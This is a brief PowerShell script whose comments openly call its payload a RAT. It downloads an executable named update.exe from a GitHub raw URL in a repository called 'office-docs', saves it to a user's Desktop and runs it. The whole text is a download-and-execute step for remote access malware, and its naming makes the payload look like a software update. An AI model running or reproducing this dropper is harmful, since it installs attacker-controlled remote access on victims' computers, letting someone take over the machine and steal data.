$filePath = "C:\Users\ancho\Desktop\test_update.exe"
$url = "https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/update.exe"

# Download RAT
Invoke-WebRequest -Uri $url -OutFile $filePath

# Execute RAT
& $filePath